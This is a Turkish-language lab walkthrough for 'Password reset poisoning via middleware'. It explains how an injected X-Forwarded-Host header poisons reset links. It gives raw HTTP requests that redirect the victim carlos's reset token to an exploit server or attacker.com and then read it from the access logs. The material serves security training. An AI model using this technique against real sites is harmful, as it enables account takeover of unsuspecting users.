# Password reset poisoning via middleware

## Konu Açıklaması (Password Reset Poisoning & Host Header Injection)

### 1. Password Reset Poisoning (Şifre Sıfırlama Zehirlemesi)
Modern web mimarilerinde uygulamalar genellikle ters vekil sunucuların (reverse proxy), yük dengeleyicilerin (load balancer) veya ara yazılımların (middleware) arkasında çalışır. 
* Şifre sıfırlama e-postaları gönderilirken kullanıcıya iletilecek bağlantı (URL) dinamik olarak oluşturulabilir.
* Eğer sunucu veya ara yazılım bu URL'i oluştururken istemciden gelen güvenilmez HTTP başlıklarına (örneğin `Host`, `X-Forwarded-Host`, `X-Forwarded-Server`) körü körüne güvenirse, bağlantının alan adı zehirlenebilir.

---

### 2. Middleware ve Host Header Enjeksiyonu Mekanizması
* **Normal Akış:** Kullanıcı şifre sıfırlama talebinde bulunur -> Sunucu meşru alan adını (`example.com/forgot-password?token=XYZ`) içeren bağlantıyı e-postaya ekler.
* **Zehirlenmiş Akış (Poisoned Flow):** Saldırgan, kurbanın kullanıcı adı için şifre sıfırlama isteği gönderirken HTTP isteğine saldırganın sunucusunu gösteren bir başlık ekler:
  ```http
  X-Forwarded-Host: attacker.com
  ```
* Uygulama ara yazılımı bu başlığı dikkate alırsa, kurbana giden e-postadaki bağlantı şu hale gelir:
  ```text
  https://attacker.com/forgot-password?temp-forgot-password-token=SECRET_TOKEN
  ```
* Kurban e-postadaki bu bağlantıya tıkladığında, gizli sıfırlama token'ı doğrudan saldırganın sunucu loglarına (Access Log) düşer. Saldırgan bu token'ı kullanarak kurbanın şifresini sıfırlar ve hesabı ele geçirir.

---

## Lab Çözümü

### Lab Bilgileri
- **Lab Adı:** Password reset poisoning via middleware
- **Zafiyet Türü:** Authentication / Password Reset Poisoning (Host Header / X-Forwarded-Host Middleware Injection)
- **Amaç:** Şifre sıfırlama bağlantısını `X-Forwarded-Host` başlığı üzerinden zehirleyerek `carlos` kullanıcısına gönderilen sıfırlama token'ını ele geçirmek ve hesabına erişim sağlamak.
- **Referans Bilgiler:**
  - **Hedef Kullanıcı:** `carlos`
  - **Araçlar:** Burp Suite (Repeater), Exploit Server

### Çözüm Adımları

1. **Şifre Sıfırlama Talebinin Gönderilmesi:**
   * Login sayfasındaki **"Forgot password?"** alanına gidin.
   * `carlos` kullanıcı adını girin ve isteği gönderirken Burp Suite ile yakalayın.
   * Giden `POST /forgot-password` isteğini **Burp Repeater**'a aktarın.

2. **X-Forwarded-Host Başlığının Enjekte Edilmesi:**
   * Burp Exploit Server'ı açın ve sunucu adresinizi (örneğin `exploit-YOUR-ID.exploit-server.net`) kopyalayın.
   * Repeater'daki `POST /forgot-password` isteğine aşağıdaki HTTP başlığını ekleyin:
     ```http
     POST /forgot-password HTTP/1.1
     Host: YOUR-LAB-ID.web-security-academy.net
     X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
     Content-Type: application/x-www-form-urlencoded
     Content-Length: ...

     username=carlos
     ```
   * İsteği gönderin ve sunucudan `200 OK` veya başarılı yönlendirme yanıtı alındığını doğrulayın.

3. **Kurbanın E-postayı Tetiklemesi ve Token Sızıntısı:**
   * Arka planda çalışan simülasyon kurbanı (`carlos`), e-postasına gelen bağlantıya tıklayacaktır.
   * Bağlantının domain kısmı zehirlendiği için Carlos'un tarayıcısı Exploit Server'ınıza yönlendirilir.

4. **Exploit Server Loglarından Token'ın Alınması:**
   * Exploit Server sayfasına dönün ve **Access log** butonuna tıklayın.
   * Carlos'un tarayıcısından gelen HTTP isteğini inceleyin:
     ```http
     GET /forgot-password?temp-forgot-password-token=TOKEN_DEGERI HTTP/1.1
     Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
     User-Agent: VictimUser...
     ```
   * Buradaki `temp-forgot-password-token` değerini kopyalayın.

5. **Şifrenin Sıfırlanması ve Hesaba Giriş:**
   * Tarayıcınızda veya Burp Repeater üzerinde lab sitesinin meşru sıfırlama URL'ini açın:
     ```text
     https://YOUR-LAB-ID.web-security-academy.net/forgot-password?temp-forgot-password-token=CALINAN_TOKEN
     ```
   * Formu doldurarak `carlos` için yeni bir şifre belirleyin ve gönderin.
   * Belirlediğiniz yeni şifreyle `carlos` olarak sisteme giriş yapın ve laboratuvarı tamamlayın.
